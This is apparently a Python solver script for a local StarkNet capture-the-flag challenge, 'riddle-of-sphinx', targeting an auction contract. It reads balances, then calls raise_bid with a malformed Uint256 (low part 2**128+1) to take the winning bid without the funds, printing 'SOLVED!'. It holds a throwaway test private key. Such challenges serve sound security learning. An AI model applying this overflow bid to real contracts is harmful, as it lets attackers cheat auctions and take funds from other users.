from starknet_py.contract import Contract
from starknet_py.net import AccountClient, KeyPair
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.models.chains import StarknetChainId
from starknet_py.net.networks import TESTNET
from starknet_py.net.signer.stark_curve_signer import StarkCurveSigner
from starkware.starknet.core.os.contract_address.contract_address import \
    calculate_contract_address_from_hash
from starkware.crypto.signature.signature import private_to_stark_key

testnet = "testnet"
chain_id = StarknetChainId.TESTNET

if __name__ == "__main__":
   
    # TO CHANGE /*

    # Update your info after running ./run.sh riddle-of-sphinx 31337 5050 in a terminal (don't shutdown it)
    # And in an another terminal do nc localhost 31137, this will show you an interface, press 1, 1.
    # This will show you can all the variable use in this contract, copy paste them here.
    uuid="7bd2134b-567a-4fd4-88f3-5dd0494f55d4"
    rpc_endpoint="http://7bd2134b-567a-4fd4-88f3-5dd0494f55d4@127.0.0.1:5050"
    private_key="0xe44d7d9909d5ed624cb18b65f8dc2a14"
    player_address="23307312107433609350014491282813071041812899821410253437176121181065082512"
    contract=("")

    # TO CHANGE */

    prvkey=int(private_key, 16)
    pubkey=private_to_stark_key(prvkey)
    key_pair=KeyPair(private_key=prvkey, public_key=pubkey)
    player_address=calculate_contract_address_from_hash(
        salt=20,
        class_hash=1803505466663265559571280894381905521939782500874858933595227108099796801620,
        constructor_calldata=[pubkey],
        deployer_address=0
    )

    gateway_client = GatewayClient(rpc_endpoint, TESTNET)
    print("Player address", hex(player_address))

    signer = StarkCurveSigner(player_address, key_pair, StarknetChainId.TESTNET)
    account_client = AccountClient(
        client=gateway_client,
        address=player_address,
        signer=signer,
        supported_tx_version=1,
    )

    auction_contract = Contract.from_address_sync(contract, account_client)

    token_address = auction_contract.functions["token"].call_sync()
    token_address = getattr(token_address,"token_address")
    print("Token Address", token_address, hex(token_address))

    token_contract = Contract.from_address_sync(token_address, account_client)

    my_balance = token_contract.functions["balanceOf"].call_sync(player_address)

    print("My Balance", my_balance)


    my_balance = auction_contract.functions["balanceOf"].call_sync(player_address)
    print("My Auction Balance", my_balance)

    my_balance = auction_contract.functions["auctionBalanceOf"].call_sync(1,player_address)
    print("Acution balance of 1:", my_balance)

    winner = auction_contract.functions["current_winner"].call_sync(1)
    winner = getattr(winner,"current_winner")
    print("Winner", winner, hex(winner))

    print("Raising bid")
    auction_contract.functions["raise_bid"].invoke_sync(1, {
        "high": 0, "low": 2**128 +1
    }, max_fee=0)

    winner = auction_contract.functions["current_winner"].call_sync(1)
    winner = getattr(winner,"current_winner")
    print("Winner", winner, hex(winner))

    if winner == player_address:
        print("SOLVED!")